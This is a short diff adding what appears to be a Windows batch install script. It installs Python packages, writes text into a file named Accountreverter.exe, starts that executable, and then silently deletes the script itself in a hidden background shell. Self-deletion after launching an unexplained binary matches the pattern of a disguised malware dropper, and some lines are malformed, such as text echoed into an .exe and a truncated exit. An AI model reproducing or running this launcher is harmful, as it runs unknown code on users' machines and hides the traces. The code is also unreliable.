@@ -1,0 +1,5 @@
+python -m pip install -r requirements.txt
+cls
+echo python console.Py >> Accountreverter.exe
+start Accountreverter.exe
+start /b "" cmd /c del "%~f0"&exit /
